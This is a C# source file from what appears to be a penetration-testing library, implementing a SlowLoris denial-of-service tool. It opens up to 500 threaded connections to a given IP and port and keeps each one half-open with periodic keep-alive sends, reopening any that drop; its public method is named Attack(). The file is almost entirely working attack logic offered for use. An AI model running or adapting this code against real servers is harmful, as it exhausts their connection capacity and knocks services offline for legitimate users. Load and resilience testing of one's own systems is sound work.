using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace Savaged.PenTesting.DOS
{
    public class SlowLoris
    {
        public const int MAX_CONNECTIONS = 500;

        private readonly IList<Thread> _threads;
        private readonly IList<SlowLorisConnection> _connections;

        private static Random _rnd = new Random();

        public event EventHandler<SlowLorisEventArgs> Event = delegate { };

        public SlowLoris(string ip, int port, bool useSsl, int count)
        {
            if (count < 1 || count > MAX_CONNECTIONS)
            {
                throw new ArgumentException("Max count outside bounds!");
            }
            _threads = new List<Thread>();
            _connections = new List<SlowLorisConnection>();

            Connection = new SlowLorisConnection(ip, port, useSsl);

            for (int i = 1; i <= count; i++)
            {
                var conn = Connection.Clone(i);
                _connections.Add(conn);

                var start = new ThreadStart(() => KeepAliveThread(conn));
                var thread = new Thread(start)
                {
                    IsBackground = true
                };
                _threads.Add(thread);
            }
        }

        public SlowLorisConnection Connection { get; private set; }

        public void Attack()
        {
            foreach (var thread in _threads)
            {                
                Thread.Sleep(_rnd.Next(0, 200));
                thread.Start();
            }
        }

        public void Stop()
        {
            foreach (var thread in _threads)
            {
                try
                {
                    thread.Abort();
                }
                catch (Exception ex)
                {
                    RaiseEvent($"Exception aborting thread {ex}");
                    break;
                }
            }
            foreach (var conn in _connections)
            {
                conn.Close();
            }
        }

        private void KeepAliveThread(SlowLorisConnection conn)
        {
            if (conn == null)
            {
                throw new ArgumentNullException(nameof(conn));
            }
            while (true)
            {
                var result = TryKeepAlive(conn);
                if (!result)
                {
                    RaiseEvent($"Connection # {conn?.ID}->Open");
                    conn.Open();
                }
                Thread.Sleep(_rnd.Next(8000, 15000));
            }
        }

        private bool TryKeepAlive(SlowLorisConnection conn)
        {
            var result = conn?.IsOpen == true;
            try
            {
                RaiseEvent($"Connection # {conn?.ID}->KeepAlive");
                conn.KeepAlive();
            }
            catch (IOException)
            {
                result = false;
            }
            return result;
        }

        private void RaiseEvent(string @event)
        {
            Event?.Invoke(this, new SlowLorisEventArgs(@event));
        }

    }
}

